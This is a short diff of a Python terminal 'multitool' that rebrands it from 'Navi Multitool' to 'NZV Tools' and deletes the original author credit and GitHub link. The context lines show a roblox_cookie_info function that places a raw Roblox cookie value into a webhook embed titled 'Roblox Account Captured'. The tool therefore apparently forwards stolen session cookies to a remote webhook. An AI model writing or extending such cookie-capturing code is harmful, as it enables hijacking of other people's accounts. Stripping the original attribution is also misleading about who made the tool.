@@ -5,8 +5,8 @@
 # | |\  | (_| |\ V /  _ | |
 # |_| \_|\__,_| \_/  (_)|_|
 # 
-# Navi Multitool - Developed by glockinhand
-# GitHub: https://github.com/c7s89r/navi-multitool
+# NZV Tools - Terminal Multitool
+
 
 import requests, json, time, os, re
 from typing import Literal, Optional
@@ -290,7 +290,7 @@ def roblox_cookie_info():
                 fields.append({"name": "🍪 Cookie", "value": f"```\n{ck}\n```", "inline": False})
             
             payload = {
-                "username": "Navi Cookie Info",
+                "username": "NZV Cookie Info",
                 "avatar_url": "https://i.ibb.co/0R0MPTwz/avatars-000615381687-t475ap-t240x240-removebg-preview.png",
                 "embeds": [{
                     "title": "<:2978robloxlogo:1509632404665401506> Roblox Account Captured",
